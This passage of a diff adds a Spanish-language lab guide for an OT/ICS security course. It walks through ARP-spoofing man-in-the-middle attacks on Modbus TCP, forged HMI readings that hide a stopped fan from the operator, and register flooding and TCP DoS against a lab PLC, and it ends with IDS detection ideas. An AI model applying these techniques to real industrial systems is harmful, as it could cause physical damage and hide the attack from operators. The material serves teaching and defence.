+    sin auditoría de acceso — el incidente parece un fallo del ventilador, no un ataque.
+  </div>
+
+  <h3>Restaurar antes del siguiente lab</h3>
+  <pre><code>python3 -c "
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient('192.168.55.48', port=502)
+c.connect()
+c.write_coil(address=0, value=True)
+c.write_coil(address=1, value=True)
+print('Sistema restaurado')
+c.close()
+"</code></pre>
+
+  <hr>
+
+  <h2>🔴 LAB 3 — MITM con ARP Spoofing + Falsificación Modbus</h2>
+  <h3>Objetivo: posicionarse entre PLC y FUXA, modificar el proceso e intentar ocultar el ataque al operador</h3>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Concepto clave:</strong> ARP Spoofing envenena las tablas ARP de los dispositivos
+    de la red para redirigir el tráfico a través del atacante. En una red sin seguridad de capa 2
+    (sin Dynamic ARP Inspection, sin 802.1X), es trivial y no deja rastros obvios.
+  </div>
+
+  <h3>Ejemplo real — Industroyer/CrashOverride (Ucrania, 2016)</h3>
+  <p>
+    El malware Industroyer causó un corte eléctrico en Kiev dejando sin luz a 230.000 personas
+    durante 6 horas. Implementó módulos nativos para Modbus, IEC 60870-5-104 e IEC 61850,
+    enviando comandos directamente a los relés de subestaciones eléctricas.
+    También incluía un módulo de borrado de logs para eliminar evidencia después del ataque.
+  </p>
+
+  <h3>Paso 1 — Iniciar ARP Spoofing (Terminal 1 — dejar corriendo)</h3>
+  <pre><code>sudo bash 1_arp_spoof.sh</code></pre>
+
+  <p>Verificar que las MACs del PLC y FUXA ahora apuntan a Kali:</p>
+  <pre><code># Desde el PLC o FUXA — las MACs del otro extremo deben ser la MAC de Kali
+arp -a</code></pre>
+
+  <h3>Paso 2 — Monitor en tiempo real (Terminal 2)</h3>
+  <pre><code>python3 2_monitor.py</code></pre>
+
+  <h3>Paso 3 — Ejecutar ataque con falsificación (Terminal 3)</h3>
+  <pre><code>sudo python3 3_ataque.py</code></pre>
+  <p>Elegir opción <strong>2 — Falsificación total</strong></p>
+
+  <h3>Lo que ocurre</h3>
+  <ol>
+    <li>El ARP spoofing posiciona a Kali entre PLC (.48) y FUXA (.124)</li>
+    <li>Todo el tráfico Modbus TCP pasa por Kali antes de llegar al destino</li>
+    <li>El script apaga el ventilador en el PLC (FC05)</li>
+    <li>Kali intercepta las respuestas FC01 del PLC hacia FUXA</li>
+    <li>Modifica el bit del ventilador de 0 a 1 antes de reenviar</li>
+    <li>FUXA recibe una respuesta falsificada — muestra ventilador ON</li>
+    <li>El operador no detecta nada — la temperatura sube sin explicación aparente</li>
+  </ol>
+
+  <div style="background-color: #3d1515; padding: 15px; border-left: 5px solid #ff4444; margin-bottom: 20px;">
+    <strong>⚠️ Nota técnica del laboratorio:</strong> La implementación con Python/NFQUEUE
+    introduce latencia que puede causar intermitencia en el HMI. En ataques reales como
+    Industroyer, esto se implementa en código nativo C con latencias de microsegundos.
+    El concepto es válido y demostrable — la limitación es de la herramienta de laboratorio,
+    no del vector de ataque.
+  </div>
+
+  <h3>Al terminar</h3>
+  <pre><code># Ctrl+C en el script → opción 3 Restaurar → Ctrl+C en arpspoof</code></pre>
+
+  <hr>
+
+  <h2>🔴 LAB 4 — Flooding y saturación de registros</h2>
+  <h3>Objetivo: hacer el proceso completamente ininteligible e inoperable</h3>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Concepto clave:</strong> Un ataque de flooding Modbus no necesita saber
+    qué hace cada registro — basta con saturar el PLC con escrituras aleatorias para
+    que el proceso quede fuera de control. Es el equivalente industrial de un DoS,
+    pero con consecuencias físicas.
+  </div>
+
+  <h3>Ejemplo real — Colonial Pipeline (EE.UU., 2021)</h3>
+  <p>
+    El ransomware que afectó Colonial Pipeline no atacó directamente los sistemas OT,
+    pero el operador los apagó preventivamente por miedo a que el malware se propagara
+    desde la red IT. El resultado fue el mismo: el oleoducto dejó de funcionar 6 días,
+    causando escasez de combustible en la costa este de EE.UU. y un estado de emergencia.
+    Un flooding directo sobre los sistemas de control hubiera tenido el mismo efecto
+    sin necesidad de ransomware.
+  </p>
+
+  <h3>Paso 1 — Iniciar ARP Spoofing (Terminal 1)</h3>
+  <pre><code>sudo bash 1_arp_spoof.sh</code></pre>
+
+  <h3>Paso 2 — Ejecutar flooding (Terminal 2)</h3>
+  <pre><code>python3 ataque_flood.py</code></pre>
+
+  <h3>Modos disponibles</h3>
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Opción</th>
+        <th>Modo</th>
+        <th>Velocidad</th>
+        <th>Efecto en FUXA</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>1</td>
+        <td>Coils random</td>
+        <td>20 escrituras/seg</td>
+        <td>Bomba y ventilador parpadean sin control</td>
+      </tr>
+      <tr>
+        <td>2</td>
+        <td>Registros random</td>
+        <td>20 escrituras/seg</td>
+        <td>Temperatura y nivel muestran valores entre 0 y 32767</td>
+      </tr>
+      <tr>
+        <td>3</td>
+        <td>Flood total</td>
+        <td>50 ciclos/seg</td>
+        <td>Todo el proceso errático simultáneamente</td>
+      </tr>
+      <tr>
+        <td>4</td>
+        <td>Valores extremos</td>
+        <td>10 ciclos/seg</td>
+        <td>Picos máximo/mínimo — alarmas disparándose constantemente</td>
+      </tr>
+      <tr>
+        <td>5</td>
+        <td>DoS TCP</td>
+        <td>10 conexiones paralelas</td>
+        <td>FUXA pierde comunicación — "Sin conexión" en el HMI</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Observación:</strong> El modo DoS TCP (opción 5) es particularmente relevante
+    porque los PLCs industriales tienen recursos limitados — RAM, CPU y número máximo de
+    conexiones TCP simultáneas mucho menores que un servidor convencional.
+    Saturar el stack TCP de un PLC real puede dejarlo irresponsivo y requerir un reinicio físico,
+    lo que en un proceso continuo equivale a una parada de emergencia no planificada.
+  </div>
+
+  <p>El script restaura el PLC automáticamente al hacer Ctrl+C en cada modo.</p>
+
+  <hr>
+
+  <h2>🔵 Detección — IDS sobre tráfico OT</h2>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>💡 Concepto clave:</strong> Como Modbus TCP no tiene logs de auditoría nativos,
+    la detección de ataques debe hacerse analizando el tráfico de red en tiempo real.
+    Un IDS conectado pasivamente a la red OT puede identificar patrones de ataque
+    sin interferir con el proceso industrial. Esto se llama
+    <strong>Network-Based IDS para entornos OT/ICS</strong>.
+  </div>
+
+  <p>
+    La detección de los ataques practicados en este laboratorio mediante un IDS con reglas
+    específicas para Modbus TCP se aborda en un <strong>laboratorio dedicado del módulo de IDS</strong>,
+    donde se trabaja con <strong>Snort</strong> conectado a VMnet5 con reglas personalizadas
+    para detectar reconocimiento Modbus, escrituras FC05/FC06 no autorizadas, flooding
+    de registros y ARP spoofing entre el PLC y el SCADA.
+  </p>
+
+  <p>
+    Como adelanto conceptual, estos son los tipos de eventos que un IDS bien configurado
+    detectaría sobre el tráfico generado en cada lab de este laboratorio:
+  </p>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Lab</th>
+        <th>Técnica</th>
+        <th>Qué detectaría el IDS</th>
+        <th>Tipo de regla</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Lab 1</td>
+        <td>Reconocimiento Modbus</td>
+        <td>Volumen inusual de lecturas FC01/FC03 desde una IP no autorizada</td>
+        <td>Rate-based / Policy</td>
+      </tr>
+      <tr>
+        <td>Lab 2</td>
+        <td>Inyección FC05</td>
+        <td>Write Single Coil desde IP que no es el SCADA autorizado (.124)</td>
+        <td>Policy violation</td>
+      </tr>
+      <tr>
+        <td>Lab 3</td>
+        <td>MITM + ARP Spoofing</td>
+        <td>Frames ARP reply con MAC inconsistente para IPs conocidas del PLC y FUXA</td>
+        <td>ARP inspection</td>
+      </tr>
+      <tr>
+        <td>Lab 4</td>
+        <td>Flooding de registros</td>
+        <td>Más de 10 escrituras FC05/FC06 por segundo desde la misma IP</td>
+        <td>Rate-based DoS</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div style="background-color: #3d3722; padding: 15px; border-left: 5px solid #07bdff; margin-bottom: 20px;">
+    <strong>📌 Próximo laboratorio — IDS con Snort sobre tráfico OT:</strong>
+    Se trabajará con una VM Snort dedicada conectada a VMnet5 en modo pasivo,
+    con reglas específicas para Modbus TCP. Se re-ejecutarán los ataques de este laboratorio
+    y se analizarán las alertas generadas en tiempo real, incluyendo correlación de eventos
+    en los archivos de log de Snort.
+  </div>
+
+  <hr>
+
+  <h2>🟢 COMANDOS DE EMERGENCIA</h2>
+  <p>Si algo sale mal durante el laboratorio, ejecutar en Kali:</p>
+
+  <pre><code># Parar TODO inmediatamente
+sudo pkill -f arpspoof; sudo pkill -f ataque; sudo pkill -f flood
+sudo iptables -F FORWARD; sudo iptables -t nat -F
+
+# Restaurar PLC a estado normal
+python3 -c "
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient('192.168.55.48', port=502)
+c.connect()
+c.write_coil(address=0, value=True)
+c.write_coil(address=1, value=True)
+c.write_register(address=1024, value=38)
+c.write_register(address=1025, value=62)
+print('Sistema restaurado correctamente')
+c.close()
+"</code></pre>
+
+  <hr>
+
+  <h2>📊 Comparativa de ataques</h2>
+
+  <p>Resumen de los cuatro laboratorios practicados y su nivel de detección teórico con un IDS sobre tráfico OT (abordado en el laboratorio de IDS):</p>
+
+  <table border="1" cellpadding="6" style="width: 100%; border-collapse: collapse; margin-bottom: 20px;">
+    <thead>
+      <tr style="background-color: #2e2323;">
+        <th>Lab</th>
+        <th>Técnica</th>
+        <th>Visible en FUXA</th>
+        <th>Rastro en logs Modbus</th>
+        <th>Impacto físico</th>
+        <th>Detectable con IDS</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>Lab 1</td>
+        <td>Reconocimiento Modbus</td>
+        <td>No</td>
+        <td>Ninguno</td>
+        <td>Ninguno</td>
+        <td>Solo por volumen de lecturas</td>
+      </tr>
+      <tr>
+        <td>Lab 2</td>
+        <td>Inyección FC05</td>
+        <td>Sí — operador ve el cambio</td>
+        <td>Ninguno en Modbus</td>
+        <td>Temperatura crítica</td>
+        <td>Sí — cambio no autorizado</td>
+      </tr>
+      <tr>
+        <td>Lab 3</td>
+        <td>MITM + falsificación</td>
+        <td>Parcial — HMI falsificado</td>
+        <td>Ninguno</td>
+        <td>Temperatura crítica</td>
+        <td>Sí — MAC cambia, física imposible</td>
+      </tr>
+      <tr>
+        <td>Lab 4</td>
+        <td>Flooding / DoS</td>
+        <td>Sí — valores erráticos</td>
+        <td>Ninguno en Modbus</td>
+        <td>Pérdida total de control</td>
+        <td>Sí — cambios masivos y rápidos</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <h2>💡 Lecciones Aprendidas</h2>
+  <ul>
+    <li>
+      <strong>Modbus TCP fue diseñado para confianza implícita:</strong>
+      Cualquier dispositivo en la misma red puede leer y escribir todos los registros del PLC.
+      No hay autenticación, no hay autorización, no hay cifrado, no hay auditoría.
+      Fue diseñado así intencionalmente para un mundo donde las redes OT eran aisladas físicamente.
+    </li>
+    <li>
+      <strong>La convergencia IT/OT es el vector de entrada:</strong>
+      En todos los casos reales citados (Oldsmar, Triton, Industroyer), el atacante primero
+      comprometió la red IT y luego se movió lateralmente a la red OT.
+      La segmentación de red es la defensa más efectiva en costo.
+    </li>
+    <li>
+      <strong>El operador ve el efecto, no la causa:</strong>
+      Sin logs de escritura Modbus, un ataque de inyección parece un fallo de equipamiento.
+      La forensia post-incidente en entornos OT es extremadamente difícil.
+    </li>
+    <li>
+      <strong>Los PLCs son dispositivos con recursos muy limitados:</strong>
+      Un DoS TCP que apenas perturbaría un servidor web puede dejar un PLC completamente
+      irresponsivo, requiriendo intervención física.
+    </li>
+    <li>
+      <strong>La detección debe ser por comportamiento del proceso:</strong>
+      Como Modbus no genera logs de seguridad, los IDS industriales monitorizan
+      si el proceso físico se comporta de forma coherente — temperatura, presión, caudal —
+      no solo el tráfico de red.
+    </li>
+    <li>
+      <strong>La única defensa técnica absoluta es la autenticación de capa de aplicación:</strong>
+      OPC-UA con certificados, DNP3 Secure Authentication v5, o Modbus sobre TLS.
+      Pero la defensa más efectiva es la segmentación — si el atacante no llega
+      a la red OT, no puede hablar con el PLC.
+    </li>
+  </ul>
+
+  <hr>
+
+  <h2>📚 Referencias</h2>
+  <ul>
+    <li>MITRE ATT&CK for ICS: <a href="https://attack.mitre.org/matrices/ics/" target="_blank">https://attack.mitre.org/matrices/ics/</a></li>
+    <li>CISA — Securing Industrial Control Systems: <a href="https://www.cisa.gov/ics" target="_blank">https://www.cisa.gov/ics</a></li>
+    <li>ICS-CERT Advisory — Triton/TRISIS: <a href="https://www.cisa.gov/news-events/ics-advisories" target="_blank">https://www.cisa.gov/news-events/ics-advisories</a></li>
+    <li>OpenPLC Runtime: <a href="https://github.com/thiagoralves/OpenPLC_v3" target="_blank">https://github.com/thiagoralves/OpenPLC_v3</a></li>
+    <li>FUXA SCADA: <a href="https://github.com/frangoteam/FUXA" target="_blank">https://github.com/frangoteam/FUXA</a></li>
+    <li>NIST SP 800-82 — Guide to ICS Security: <a href="https://csrc.nist.gov/publications/detail/sp/800-82/rev-3/final" target="_blank">https://csrc.nist.gov/</a></li>
+  </ul>
+
+  <section>
+    <h2>Ejercicios de Control</h2>
+    <div class="iframe-wrapper">
+      <iframe src="https://app.lumi.education/api/v1/run/TU_CODIGO_AQUI/embed" width="1088" height="400" frameborder="0" allowfullscreen="allowfullscreen"></iframe>
+    </div>
+  </section>
+
+  <form id="form-reportar" class="form-horizontal">
+    <input type="hidden" id="titulo" name="titulo" value="Ciberseguridad OT/ICS — Ataques Modbus TCP">
+    <input type="hidden" id="archivo" name="archivo" value="guia_scada_ot.html">
+    <input type="hidden" id="fecha" name="fecha">
+    <textarea id="comentario" name="comentario" placeholder="¿Tuviste problemas ejecutando algún script, con la conectividad entre VMs, o con el comportamiento esperado del laboratorio? Describí el error aquí." required></textarea>
+    <button type="submit">Enviar Reporte</button>
+  </form>
+
+  <div id="mensaje-envio" style="margin-top:10px; color: green;"></div>
+
+</main>
+<div data-include="footer"></div>
+<script src="assets/js/scripts.js"></script>
+</body>
+</html>
